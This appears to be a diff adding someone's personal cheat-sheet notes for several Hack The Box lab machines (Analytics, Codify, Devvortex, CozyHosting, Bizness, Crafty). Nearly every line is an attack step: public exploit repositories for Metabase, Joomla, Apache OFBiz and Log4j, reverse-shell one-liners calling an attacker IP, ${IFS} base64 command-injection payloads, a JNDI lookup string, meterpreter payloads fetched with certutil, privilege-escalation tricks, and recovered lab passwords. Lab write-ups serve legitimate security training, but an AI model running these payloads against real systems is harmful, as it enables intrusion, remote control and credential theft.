@@ -1,0 +1,101 @@
+容易忘
+
+Analytics
+data.analytical.htb
+https://github.com/m3m0o/metabase-pre-auth-rce-poc
+nc -lvnp 1234
+python3 main.py -u http://data.analytical.htb -t '249fa03d-fd94-4d5b-b94f-b4ebf3df681f' -c 'sh -i >& /dev/tcp/kali ip/port 0>&1'
+cat /proc/self/environ
+ssh metalytics@10.10.11.233
+password: An4lytics_ds20223#
+priv:
+https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629
+./exploit.sh
+
+Codify
+nc -lvnp 1234
+https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.3 1234 >/tmp/f
+cat /var/www/contact/tickets.db
+john
+ssh joshua@10.10.11.239
+password: spongebob1
+priv:
+git clone https://github.com/will890731/Codify-brute
+目標機 python3 Codify-brute.py
+su root
+password: kljh12k3jhaskjh12kjh3
+
+Devvortex
+dev.devvortex.htb
+https://www.kali.org/tools/joomscan/
+https://vulncheck.com/blog/joomla-for-rce
+置換php System -> Templates -> Administrator Templates
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+nc -lvnp 1234
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+mysql -u lewis -p
+password: P4ntherg0t1n5r3c0n##
+show databases;
+use joomla;
+show tables;
+select * from sd4fg_users;
+ssh logan@10.10.11.242
+password: tequieromucho
+priv:
+sudo /usr/bin/apport-cli --file-bug
+1
+2
+V
+!/bin/bash
+
+CozyHosting
+echo "bash -i >& /dev/tcp/10.10.16.3/1236 0>&1" | base64 -w 0
+關鍵字 echo ifs payload base64 ifs d bash
+echo${IFS}COMMAND_BASE64|base64${IFS}-d|bash
+url編碼
+;echo${IFS}COMMAND_BASE64|base64${IFS}-d|bash;
+jd-gui
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+psql -h 127.0.0.1 -U postgres
+Vg&nvzAQ7XxR
+\c cozyhosting
+\d
+\c cozyhosting
+select * from users;
+priv ssh
+
+Bizness
+https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
+nc -lvnp 1234
+python3 exploit.py --url https://bizness.htb/ --cmd 'nc 10.10.16.4 1234 -e /bin/bash'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+git clone https://github.com/will890731/SHA-Decode.git
+grep -a currentPassword /opt/ofbiz/runtime/data/derby/ofbiz/seg0/*.dat
+python3 SHA-Decode.py
+get root password
+
+Crafty
+https://github.com/kozmer/log4j-shell-poc
+wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
+tar -xf jdk-8u181-linux-x64.tar.gz
+mv jdk1.8.0_181 jdk1.8.0_20
+python3 poc.py --userip 10.10.16.4 --webport 80 --lport 1234
+nc -lvnp 1234
+git clone https://github.com/will890731/pyCraft.git
+python3 start.py
+1
+Enter
+10.10.11.249
+${jndi:ldap://10.10.16.4:1389/a}
+msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.16.3; set lport 8888; exploit"
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=8888 -f exe -o rev.exe
+certutil.exe -urlcache -f http://10.10.16.4:8080/rev.exe c:\Users\svc_minecraft\Desktop\rev.exe && c:\Users\svc_minecraft\Desktop\rev.exe
+download c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar
+jd-gui
+s67u84zKq8IXw
+https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=8889 -f exe -o revAdmin.exe
+msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.16.3; set lport 8889; exploit"
+upload RunasCs.exe revAdmin.exe
+RunasCs.exe Administrator s67u84zKq8IXw revAdmin.exe
